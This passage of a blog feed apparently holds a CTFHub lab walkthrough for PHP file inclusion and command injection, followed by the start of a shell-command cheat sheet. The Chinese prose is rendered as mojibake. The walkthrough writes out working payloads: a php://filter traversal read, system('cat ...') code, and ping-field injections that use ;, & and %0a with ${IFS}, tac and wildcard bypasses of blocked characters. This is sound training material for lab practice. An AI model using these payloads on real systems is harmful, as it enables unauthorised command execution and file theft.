/&#39;)?&gt;</code>æŸ¥çœ‹ä¸Šä¸€çº§æ–‡ä»¶ï¼Œæˆ‘ä»¬å‘ç°æ ¹ç›®å½•ä¸‹æœ‰flag_16455</p><p><img src="/2023/07/15/ctfhub/image-20230821145722819.png" alt="image-20230821145722819"></p><p>è¿›å…¥flag_16455æŸ¥çœ‹æ–‡ä»¶</p><p><code>&lt;?php system(&#39;cat /flag_16455&#39;)?&gt;</code></p><p>å¾—åˆ°flag</p><p><img src="/2023/07/15/ctfhub/image-20230821145817919.png" alt="image-20230821145817919"></p><h2 id="è¿œç¨‹åŒ…å«"><a href="#è¿œç¨‹åŒ…å«" class="headerlink" title="è¿œç¨‹åŒ…å«"></a>è¿œç¨‹åŒ…å«</h2><p>1.æŸ¥çœ‹é¶åœºç¯å¢ƒ</p><p><img src="/2023/07/15/ctfhub/image-20230823105659962.png" alt="image-20230823105659962"></p><p>è§£æä¸€ä¸‹ä»£ç </p><p><code>if(isset($_GET[&#39;file&#39;]))</code>å¦‚æœä¼ å…¥çš„å‚æ•°å­˜åœ¨ï¼Œæ‰§è¡Œä¸‹é¢çš„è¯­å¥ã€‚</p><blockquote><p><code>if(!strpos($_GET[&quot;file&quot;],&quot;flag&quot;))&#123;</code></p><p><code>   include $_GET[&quot;file&quot;];&#125;</code></p><p>strposå‡½æ•°æ˜¯ç”¨äºæŸ¥æ‰¾å­—ç¬¦ä¸²ä¸­<code>ç¬¬ä¸€æ¬¡å‡ºç°çš„ä½ç½®</code>(åŒºåˆ†å¤§å°å†™)ï¼Œä»0å¼€å§‹æ•°</p><p>ä¾‹å¦‚ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">strpos</span>(<span class="string">&quot;I love php, I love php too!&quot;</span>, <span class="string">&quot;php&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>ä¸Šé¢ä»£ç ç¬¬ä¸€æ¬¡å‡ºç°â€phpâ€œçš„ä½ç½®æ˜¯ç¬¬7ä¸ªä½ç½®ã€‚</p><p>ä½œç”¨æ˜¯strpos($_GET[â€œfileâ€], â€œflagâ€) {ä¸ºçœŸï¼Œ<br>ç¬¬ä¸€ä¸ªflagåœ¨æœ€å‰é¢è¿”å›0<br>ç¬¬äºŒä¸ªæ²¡æœ‰flagåœ¨å‚æ•°ï¼Œä¹Ÿè¿”å›ç©ºä¹Ÿå¯ä»¥å½“åš0</p></blockquote><blockquote><p><code>!strpos($_GET[&quot;file&quot;],&quot;flag&quot;</code>å½“å‡½æ•°çš„ç¬¬ä¸€ä¸ªä½ç½®æ˜¯flagæˆ–è€…æ²¡æœ‰flagå­—ç¬¦ä¸²ï¼Œè¿”å›çš„éƒ½æ˜¯0</p><p>!0=1 ä¸ºçœŸ </p><p>!1=0 ä¸ºå‡</p><p>åˆ¤æ–­ä¸ºçœŸï¼Œç»§ç»­æ‰§è¡Œä»£ç ï¼Œ</p><p>includeï¼Œæ–‡ä»¶åŒ…å«å‡½æ•°ï¼Œ</p></blockquote><p>2.æŸ¥çœ‹phpinfoé…ç½®æ–‡ä»¶ï¼Œå‘ç°èƒ½å¤Ÿä½¿ç”¨php://inputä¼ªåè®®</p><p><img src="/2023/07/15/ctfhub/image-20230824105912655.png" alt="image-20230824105912655"></p><p>çœ‹åˆ°æ ¹ç›®å½•åº•ä¸‹æœ‰flagï¼Œcatçœ‹ä¸€ä¸‹ï¼Œå¾—åˆ°flag</p><p><img src="/2023/07/15/ctfhub/image-20230824110043408.png" alt="image-20230824110043408"></p><h2 id="è¯»å–æºä»£ç "><a href="#è¯»å–æºä»£ç " class="headerlink" title="è¯»å–æºä»£ç "></a>è¯»å–æºä»£ç </h2><p>1.æ‰“å¼€é¢˜ç›®ï¼ŒæŸ¥çœ‹ä»£ç </p><p><img src="/2023/07/15/ctfhub/image-20230824110450032.png" alt="image-20230824110450032"></p><p>æ ¹ä¸Šé¢å‡ å…³çš„ä»£ç å·®ä¸å¤šï¼Œå°±ä¸è§£é‡Šå•¦ï¼</p><p>æç¤ºï¼š<code>flag in &lt;code&gt;/flag&lt;/code&gt;</code></p><p>flagå¯èƒ½æ˜¯æ ¹ç¼–ç æœ‰å…³çš„ï¼ŒæŸ¥æ‰¾ä¸€ä¸‹ç›¸å…³çš„ä¼ªåè®®</p><p>2.åˆ©ç”¨php://filterä¼ªåè®®</p><p>php://filteræ˜¯ä¸€ç§å…ƒå°è£…å™¨ï¼Œè®¾è®¡ç”¨æ¥æ•°æ®æµæ‰“å¼€æ˜¯çš„ç­›é€‰è¿‡æ»¤åº”ç”¨ã€‚ç›®çš„æ˜¯ä½¿ç”¨ä¸€ä¸‹å‚æ•°ä½œä¸ºå®ƒè·¯å¾„çš„ä¸€éƒ¨åˆ†ã€‚å¤åˆè¿‡æ»¤é“¾èƒ½å¤Ÿåœ¨ä¸€ä¸ªè·¯å¾„ä¸ŠæŒ‡å®šã€‚</p><p>è¿™é“é¢˜å¯ä»¥åˆ©ç”¨base64ç¼–ç å›æ˜¾æ•°æ®</p><p>payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=php://filter/convert.base64-encode/resource=../../../flag</span><br></pre></td></tr></table></figure><p><img src="/2023/07/15/ctfhub/image-20230824112610208.png" alt="image-20230824112610208"></p><p>ç”¨base64è§£ç ï¼Œå°±å¾—åˆ°äº†flag</p><p><img src="/2023/07/15/ctfhub/image-20230824112553456.png" alt="image-20230824112553456"></p><h2 id="å‘½ä»¤æ³¨å…¥"><a href="#å‘½ä»¤æ³¨å…¥" class="headerlink" title="å‘½ä»¤æ³¨å…¥"></a>å‘½ä»¤æ³¨å…¥</h2><p>1.é¢˜ç›®æç¤ºè¿™ä¸ªæ˜¯æµ‹è¯•ç½‘ç»œå»¶è¿Ÿçš„å¹³å°ï¼Œè·¯ç”±å™¨ä¸­ç»å¸¸å‡ºç°ã€‚</p><p>æ‰“å¼€é¢˜ç›®åè¾“å…¥127.0.0.1 è¯•è¯•</p><blockquote><p><strong>ä¸€äº›linuxä¸­çš„å‘½ä»¤çš„é“¾æ¥ç¬¦å·</strong></p><p><strong>1.æ¯ä¸ªå‘½ä»¤ä¹‹é—´ç”¨<code>;</code>éš”å¼€</strong></p><p>è¯´æ˜:å„å‘½ä»¤çš„æ‰§è¡Œç»“æœï¼Œä¸ä¼šå½±å“å…¶å®ƒå‘½ä»¤çš„æ‰§è¡Œã€‚å„ä¸ªå‘½ä»¤éƒ½ä¼šæ‰§è¡Œï¼Œä½†ä¸ä¿è¯æ¯ä¸ªå‘½ä»¤éƒ½æ‰§è¡ŒæˆåŠŸã€‚</p><p><strong>2.æ¯ä¸ªå‘½ä»¤ä¹‹é—´ç”¨<code>&amp;&amp;</code>éš”å¼€</strong></p><p>è¯´æ˜ï¼šè‹¥å‰é¢çš„å‘½ä»¤æ‰§è¡ŒæˆåŠŸï¼Œæ‰ä¼šå»æ‰§è¡Œåé¢çš„å‘½ä»¤ã€‚è¿™æ ·å¯ä»¥ä¿è¯æ‰€æœ‰çš„å‘½ä»¤æ‰§è¡Œå®Œæ¯•ä¹‹åï¼Œæ‰§è¡Œè¿‡ç¨‹éƒ½æ˜¯æˆåŠŸçš„ã€‚</p><p><strong>3.æ¯ä¸ªå‘½ä»¤ä¹‹é—´ç”¨<code>||</code>éš”å¼€</strong></p><p>è¯´æ˜ï¼š||æ˜¯æˆ–çš„æ„æ€ï¼Œåªæœ‰å‰é¢çš„å‘½ä»¤æ‰§è¡Œå¤±è´¥åæ‰ä¼šå»æ‰§è¡Œä¸‹ä¸€æ¡å‘½ä»¤ï¼Œç›´åˆ°æ‰§è¡ŒæˆåŠŸä¸€æ¡å‘½ä»¤ä¸ºæ­¢ã€‚</p><p><strong>4.<code>|</code>æ˜¯ç®¡é“ç¬¦å·ã€‚</strong></p><p>ç®¡é“ç¬¦å·æ”¹å˜æ ‡å‡†è¾“å…¥çš„æºæˆ–è€…æ˜¯æ ‡å‡†è¾“å‡ºçš„ç›®çš„åœ°ã€‚</p><p><strong>5.&amp;æ˜¯åå°ä»»åŠ¡ç¬¦å·ã€‚</strong></p><p>åå°ä»»åŠ¡ç¬¦å·ä½¿shellåœ¨åå°æ‰§è¡Œè¯¥ä»»åŠ¡ä½¿shellåœ¨åå°æ‰§è¡Œè¯¥ä»»åŠ¡ï¼Œè¿™æ ·ç”¨æˆ·å°±å¯ä»¥ç«‹å³å¾—åˆ°ä¸€ä¸ªæç¤ºç¬¦å¹¶ç»§ç»­å…¶ä»–å·¥ä½œã€‚</p></blockquote><p>ä½¿ç”¨&amp;è¿æ¥ç¬¦ï¼Œè¿æ¥åˆ«å‘½ä»¤è¯•ä¸€ä¸‹ï¼Œå‘ç°ä¹Ÿæ‰§è¡Œäº†åé¢çš„å‘½ä»¤ï¼Œä¸”æ–‡ä»¶å¤¹ä¸‹æœ‰ä¸€ä¸ªphpæ–‡ä»¶</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1 &amp; ls</span><br></pre></td></tr></table></figure><p><img src="/2023/07/15/ctfhub/image-20230824153431399.png" alt="image-20230824153431399"></p><p><strong><code>å‘ç°æœ‰ä¸€ä¸ªphpæ–‡ä»¶ï¼Œå› ä¸ºphpæ–‡ä»¶å†…å®¹æ— æ³•ç›´æ¥æ˜¾ç¤ºåœ¨ç½‘é¡µé¡µé¢ä¸­ï¼Œæ‰€ä»¥éœ€è¦å¯¹phpå†…å®¹è¿›è¡Œç¼–ç åæ‰“å°å›æ˜¾</code></strong></p><p><img src="/2023/07/15/ctfhub/image-20230824154334627.png" alt="image-20230824154334627"></p><p><strong><code>é‚£æˆ‘ä»¬è¯•è¯•ç”¨ç®¡é“ç¬¦å·| base64ï¼Œå¯¹æˆ‘ä»¬ç›®æ ‡phpæ–‡ä»¶è¿›è¡Œbase64ç¼–ç åè¾“å‡ºç»“æœ</code></strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1&amp; cat 6932191568726.php | base64</span><br></pre></td></tr></table></figure><p><img src="/2023/07/15/ctfhub/image-20230824155139642.png" alt="image-20230824155139642"></p><p>è§£ç å¾—åˆ°flag</p><p><img src="/2023/07/15/ctfhub/image-20230824160651731.png" alt="image-20230824160651731"></p><h2 id="è¿‡æ»¤cat"><a href="#è¿‡æ»¤cat" class="headerlink" title="è¿‡æ»¤cat"></a>è¿‡æ»¤cat</h2><p>é¢˜ç›®æè¿°ï¼šè¿‡æ»¤äº†catå‘½ä»¤ä¹‹åï¼Œä½ è¿˜æœ‰ä»€ä¹ˆæ–¹æ³•èƒ½è¯»åˆ° Flag?</p><p>æ‰“å¼€é¢˜ç›®</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1&amp; ls</span><br></pre></td></tr></table></figure><p><img src="/2023/07/15/ctfhub/image-20230824161634834.png" alt="image-20230824161634834"></p><p>å‘ç°æœ‰ä¸€ä¸ªflag_119802432633.phpæ–‡ä»¶</p><p>æˆ‘ä»¬è¯•è¯•ç”¨cat</p><p><img src="/2023/07/15/ctfhub/image-20230824161834148.png" alt="image-20230824161834148"></p><p>å¥½åƒcatè¢«è¿‡æ»¤äº†ï¼Œé¢˜ç›®ä¹Ÿè¯´äº†ï¼Œæˆ‘ä»¬è¯•è¯•æ‰¾æ‰¾èƒ½ä»£æ›¿catçš„å‘½ä»¤</p><p>æƒ³åˆ°ä¸€ä¸ªtacï¼Œè¯•è¯•</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1&amp; tac  flag_119802432633.php | base64</span><br></pre></td></tr></table></figure><p><img src="/2023/07/15/ctfhub/image-20230824163309829.png" alt="image-20230824163309829"></p><p><img src="/2023/07/15/ctfhub/image-20230824163345388.png" alt="image-20230824163345388"></p><p>è§£ç åå¾—åˆ°flag</p><p><img src="/2023/07/15/ctfhub/image-20230824163408013.png" alt="image-20230824163408013"></p><h2 id="è¿‡æ»¤ç©ºæ ¼"><a href="#è¿‡æ»¤ç©ºæ ¼" class="headerlink" title="è¿‡æ»¤ç©ºæ ¼"></a>è¿‡æ»¤ç©ºæ ¼</h2><p>é¢˜ç›®æè¿°ï¼šè¿™æ¬¡è¿‡æ»¤äº†ç©ºæ ¼ï¼Œä½ èƒ½ç»•è¿‡å—</p><p>è€åŠæ³•ï¼ŒæŸ¥çœ‹ä¸€ä¸‹æ ¹ç›®å½•</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1&amp;ls</span><br></pre></td></tr></table></figure><p><img src="/2023/07/15/ctfhub/image-20230824210639851.png" alt="image-20230824210639851"></p><p>å‘ç°æœ‰ä¸€ä¸ªflag_21481267449426.php</p><p>é¢˜ç›®çš„è€ƒç‚¹æ˜¯è¿‡æ»¤ç©ºæ ¼ï¼Œæ‰€ä»¥æˆ‘ä»¬å°±æƒ³ï¼Œæœ‰ä»€ä¹ˆå¯ä»¥ä»£æ›¿ç©ºæ ¼çš„</p><p><code>&lt;æ¥ä»£æ›¿ç©ºæ ¼</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1&amp;cat&lt;flag|base64</span><br></pre></td></tr></table></figure><p><img src="/2023/07/15/ctfhub/image-20230824211528703.png" alt="image-20230824211528703"></p><p><img src="/2023/07/15/ctfhub/image-20230824211604506.png" alt="image-20230824211604506"></p><p>åœ¨base64è§£ç ï¼Œå¾—åˆ°flag</p><p><img src="/2023/07/15/ctfhub/image-20230824211640790.png" alt="image-20230824211640790"></p><h2 id="è¿‡æ»¤ç›®å½•åˆ†éš”ç¬¦"><a href="#è¿‡æ»¤ç›®å½•åˆ†éš”ç¬¦" class="headerlink" title="è¿‡æ»¤ç›®å½•åˆ†éš”ç¬¦"></a>è¿‡æ»¤ç›®å½•åˆ†éš”ç¬¦</h2><p>é¢˜ç›®æè¿°ï¼šè¿™æ¬¡è¿‡æ»¤äº†ç›®å½•åˆ†å‰²ç¬¦ / ï¼Œä½ èƒ½è¯»åˆ° flag ç›®å½•ä¸‹çš„ flag æ–‡ä»¶å—</p><p>æ‰“å¼€é¢˜ç›®ï¼Œè¯•è¯•ä¸Šé¢çš„æ–¹æ³•ï¼Œæ˜¾ç¤ºflag_is_hereï¼Œæˆ‘ä»¬cd è¿›å»çœ‹çœ‹ï¼Œ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1&amp; ls</span><br></pre></td></tr></table></figure><p><img src="/2023/07/15/ctfhub/image-20230824212802621.png" alt="image-20230824212802621"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1;cd flag_is_here;ls</span><br></pre></td></tr></table></figure><p><img src="/2023/07/15/ctfhub/image-20230824214715949.png" alt="image-20230824214715949"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1;cd flag_is_here;cat  flag_225492447926722.php|base64</span><br></pre></td></tr></table></figure><p><img src="/2023/07/15/ctfhub/image-20230824214825400.png" alt="image-20230824214825400"></p><p>è§£ç base64ï¼Œå¾—åˆ°flag</p><p><img src="/2023/07/15/ctfhub/image-20230824214913675.png" alt="image-20230824214913675"></p><h2 id="è¿‡æ»¤è¿ç®—ç¬¦"><a href="#è¿‡æ»¤è¿ç®—ç¬¦" class="headerlink" title="è¿‡æ»¤è¿ç®—ç¬¦"></a>è¿‡æ»¤è¿ç®—ç¬¦</h2><p>é¢˜ç›®æè¿°ï¼šè¿‡æ»¤äº†å‡ ä¸ªè¿ç®—ç¬¦, è¦æ€ä¹ˆç»•è¿‡å‘¢</p><p>é‚£å°è¯•ç”¨åˆ†éš”ç¬¦ï¼Œå‘ç°å¯ä»¥ç”¨<code>;</code>éš”å¼€</p><p><img src="/2023/07/15/ctfhub/image-20230824220145065.png" alt="image-20230824220145065"></p><p>æˆ‘ä»¬çœ‹åˆ°äº†flag_26423133555971,ä½†æ˜¯çœ‹ä¸€ä¸‹ç½‘ç«™æºç ï¼Œå‘ç°è¿‡æ»¤äº†<code>|</code>ç®¡é“ç¬¦å·</p><p>æ‰€ä»¥æˆ‘ä»¬ä¸èƒ½åƒå‰é¢çš„é¢˜æŠŠbase64ç¼–ç ç”¨ç®¡é“ç¬¦å·è¿æ¥</p><p><img src="/2023/07/15/ctfhub/image-20230824224431417.png" alt="image-20230824224431417"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1;base64 flag_26423133555971.php</span><br></pre></td></tr></table></figure><p>base64åœ¨å‰é¢ä¹Ÿèƒ½å¤Ÿç¼–ç ï¼Œä½¿å¾—phpæ–‡ä»¶åœ¨é¡µé¢ä¸Šæ˜¾ç¤ºå‡ºæ¥</p><p><img src="/2023/07/15/ctfhub/image-20230824222055713.png" alt="image-20230824222055713"></p><p>å°†base64è§£ç ï¼Œå¾—åˆ°</p><p><img src="/2023/07/15/ctfhub/image-20230824222246300.png" alt="image-20230824222246300"></p><h2 id="ç»¼åˆè¿‡æ»¤ç»ƒä¹ "><a href="#ç»¼åˆè¿‡æ»¤ç»ƒä¹ " class="headerlink" title="ç»¼åˆè¿‡æ»¤ç»ƒä¹ "></a>ç»¼åˆè¿‡æ»¤ç»ƒä¹ </h2><p>æ‰“å¼€é¢˜ç›®ï¼ŒæŸ¥çœ‹ç½‘ç«™æºä»£ç </p><p><img src="/2023/07/15/ctfhub/image-20230824230910180.png" alt="image-20230824230910180"></p><p>å‘ç°è¿‡æ»¤äº†å¥½å¤šï¼Œæˆ‘ä»¬ä¸€ä¸ªä¸ªçœ‹èƒ½ç”¨ä»€ä¹ˆæ›¿æ¢</p><p>çœ‹åˆ°<code>|ï¼Œ;ï¼Œ&amp;ï¼Œcatï¼Œflagï¼Œctfhubï¼Œç©ºæ ¼</code>éƒ½è¢«è¿‡æ»¤äº†</p><blockquote><p><strong>ç©ºæ ¼</strong>å¯ä»¥ç”¨${IFS}</p><p><strong>cat</strong>å¯ä»¥ç”¨more     </p><p><strong>flag</strong>å¯ä»¥ç”¨æ­£åˆ™f***</p><p><strong>ctfhub</strong>åº”è¯¥ç”¨ä¸åˆ° æŸ¥äº†ä¸€ä¸‹</p><p>åœ¨linuxä¸‹ï¼Œå‘½ä»¤åˆ†éš”ç¬¦é™¤äº†<code>;</code>è¿˜æœ‰**%0a**</p><p>æœ‰äº†<code>ï¼›</code>å°±å¯ä»¥ä¸ç”¨è¿ç®—ç¬¦äº†</p><p><code>è¿™é‡Œå› ä¸º%0aæ˜¯urlç¼–ç ï¼Œæ‰€ä»¥è¦è¾“å…¥åˆ°urlä¸­ï¼Œå¦åˆ™ä¼šè¢«äºŒæ¬¡ç¼–ç </code></p></blockquote><p>payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=127.0.0.1%0als#</span><br></pre></td></tr></table></figure><p><img src="/2023/07/15/ctfhub/image-20230825214609075.png" alt="image-20230825214609075"></p><p>æŸ¥çœ‹flag_is_here</p><p>æ„é€ payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?ip=127.0.0.1%0acd$&#123;IFS&#125;fla*_is_here%0als</span><br></pre></td></tr></table></figure><p><img src="/2023/07/15/ctfhub/image-20230825222324636.png" alt="image-20230825222324636"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ip=127.0.0.1%0acd$&#123;IFS&#125;fla*_is_here%0abase64$&#123;IFS&#125;fla*_12606277463325.php#</span><br></pre></td></tr></table></figure><p><img src="/2023/07/15/ctfhub/image-20230825222040376.png" alt="image-20230825222040376"></p><p>å°†base64è§£ç </p><p><img src="/2023/07/15/ctfhub/image-20230825223603877.png" alt="image-20230825223603877"></p>]]></content>
      
      
      <categories>
          
          <category> é¶åœºå­¦ä¹  </category>
          
      </categories>
      
      
        <tags>
            
            <tag> é¶åœºå­¦ä¹  </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>shellå¸¸ç”¨å‘½ä»¤</title>
      <link href="/2023/06/22/shell%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/"/>
      <url>/2023/06/22/shell%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/</url>
      
        <content type="html"><![CDATA[<h1 id="shellå¸¸ç”¨å‘½ä»¤"><a href="#shellå¸¸ç”¨å‘½ä»¤" class="headerlink" title="shellå¸¸ç”¨å‘½ä»¤"></a>shellå¸¸ç”¨å‘½ä»¤</h1><p><strong>å‰è¨€</strong></p><p>ä½¿ç”¨Linux  shellæ˜¯ä¸€äº›ç¨‹åºå‘˜æ¯å¤©çš„åŸºæœ¬å·¥ä½œï¼Œä½†æˆ‘ä»¬ç»å¸¸ä¼šå¿˜è®°ä¸€äº›æœ‰ç”¨çš„shellå‘½ä»¤å’ŒæŠ€å·§ã€‚å½“ç„¶ï¼Œå‘½ä»¤æˆ‘èƒ½è®°ä½ï¼Œä½†æˆ‘ä¸æ•¢è¯´èƒ½è®°å¾—å¦‚ä½•ç”¨å®ƒæ‰§è¡ŒæŸä¸ªç‰¹å®šä»»åŠ¡ã€‚éœ€è¦æ³¨æ„ä¸€ç‚¹çš„æ˜¯ï¼Œæœ‰äº›ç”¨æ³•éœ€è¦åœ¨ä½ çš„Linuxç³»ç»Ÿé‡Œå®‰è£…é¢å¤–çš„è½¯ä»¶ã€‚ä¸‹é¢è¯ä¸å¤šè¯´äº†ï¼Œæ¥çœ‹çœ‹è¯¦ç»†çš„å†…å®¹å§ã€‚</p><p><strong>æ£€æŸ¥è¿œç¨‹ç«¯å£æ˜¯å¦å¯¹bashå¼€æ”¾ï¼š</strong></p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &gt;/dev/tcp/8.8.8.8/53 &amp;&amp; echo &quot;open&quot;</span><br></pre></td></tr></table></figure><p><strong>è®©è¿›ç¨‹è½¬å…¥åå°ï¼š</strong></p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Ctrl + z</span><br></pre></td></tr></table></figure><p><strong>äº§ç”Ÿéšæœºçš„åå…­è¿›åˆ¶æ•°ï¼Œå…¶ä¸­næ˜¯å­—ç¬¦æ•°ï¼š</strong></p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openssl rand -hex n</span><br></pre></td></tr></table></figure><p><strong>åœ¨å½“å‰shellé‡Œæ‰§è¡Œä¸€ä¸ªæ–‡ä»¶é‡Œçš„å‘½ä»¤ï¼š</strong></p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">source /home/user/file.name</span><br></pre></td></tr></table></figure><p><strong>æˆªå–å‰5ä¸ªå­—ç¬¦ï¼š</strong></p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;variable:0:5&#125;</span><br></pre></td></tr></table></figure><p><strong>SSH debug æ¨¡å¼:</strong></p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -vvv user@ip_address</span><br></pre></td></tr></table></figure><p><strong>SSH with pem key:</strong></p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh user@ip_address -i key.pem</span><br></pre></td></tr></table></figure><p><strong>ç”¨wgetæŠ“å–å®Œæ•´çš„ç½‘ç«™ç›®å½•ç»“æ„ï¼Œå­˜æ”¾åˆ°æœ¬åœ°ç›®å½•ä¸­ï¼š</strong></p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget -r --no-parent --reject &quot;index.html*&quot; http://hostname/ -P /home/user/dirs</span><br></pre></td></tr></table></figure><p><strong>ä¸€æ¬¡åˆ›å»ºå¤šä¸ªç›®å½•ï¼š</strong></p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mkdir -p /home/user/&#123;test,test1,test2&#125;</span><br></pre></td></tr></table></figure><p><strong>åˆ—å‡ºåŒ…æ‹¬å­è¿›ç¨‹çš„è¿›ç¨‹æ ‘ï¼š</strong></p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ps axwef</span><br></pre></td></tr></table></figure><p><strong>åˆ›å»º war æ–‡ä»¶:</strong></p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jar -cvf name.war file</span><br></pre></td></tr></table></figure><p><strong>æµ‹è¯•ç¡¬ç›˜å†™å…¥é€Ÿåº¦ï¼š</strong></p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dd if=/dev/zero of=/tmp/output.img bs=8k count=256k; rm -rf /tmp/output.img</span><br></pre></td></tr></table></figure><p><strong>æµ‹è¯•ç¡¬ç›˜è¯»å–é€Ÿåº¦ï¼š</strong></p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hdparm -Tt /dev/sda</span><br></pre></td></tr></table></figure><p><strong>è·å–æ–‡æœ¬çš„md5 hashï¼š</strong></p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo -n &quot;text&quot; | md5sum</span><br></pre></td></tr></table></figure><p><strong>æ£€æŸ¥xmlæ ¼å¼ï¼š</strong></p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xmllint --noout file.xml</span><br></pre></td></tr></table></figure><p><strong>å°†tar.gzæå–åˆ°æ–°ç›®å½•é‡Œï¼š</strong></p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tar zxvf package.tar.gz -C new_dir</span><br></pre></td></tr></table></figure><p><strong>ä½¿ç”¨curlè·å–HTTPå¤´ä¿¡æ¯ï¼š</strong></p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -I http://www.example.com</span><br></pre></td></tr></table></figure><p><strong>ä¿®æ”¹æ–‡ä»¶æˆ–ç›®å½•çš„æ—¶é—´æˆ³(YYMMDDhhmm):</strong></p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">touch -t 0712250000 file</span><br></pre></td></tr></table></figure><p><strong>ç”¨wgetå‘½ä»¤æ‰§è¡Œftpä¸‹è½½ï¼š</strong></p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget -m ftp://username:password@hostname</span><br></pre></td></tr></table></figure><p><strong>ç”Ÿæˆéšæœºå¯†ç (ä¾‹å­é‡Œæ˜¯16ä¸ªå­—ç¬¦é•¿):</strong></p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">LANG=c &lt; /dev/urandom tr -dc _A-Z-a-z-0-9 | head -c$&#123;1:-16&#125;;echo;</span><br></pre></td></tr></table></figure><p><strong>å¿«é€Ÿå¤‡ä»½ä¸€ä¸ªæ–‡ä»¶ï¼š</strong></p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cp some_file_name&#123;,.bkp&#125;</span><br></pre></td></tr></table></figure><p><strong>è®¿é—®Windowså…±äº«ç›®å½•ï¼š</strong></p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">smbclient -U &quot;DOMAIN\user&quot; //dc.domain.com/share/test/dir</span><br></pre></td></tr></table></figure><p><strong>æ‰§è¡Œå†å²è®°å½•é‡Œçš„å‘½ä»¤(è¿™é‡Œæ˜¯ç¬¬100è¡Œ):</strong></p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">!100</span><br></pre></td></tr></table></figure><p><strong>è§£å‹:</strong></p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">unzip package_name.zip -d dir_name</span><br></pre></td></tr></table></figure><p><strong>è¾“å…¥å¤šè¡Œæ–‡å­—(CTRL + d é€€å‡º):</strong></p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat &gt; 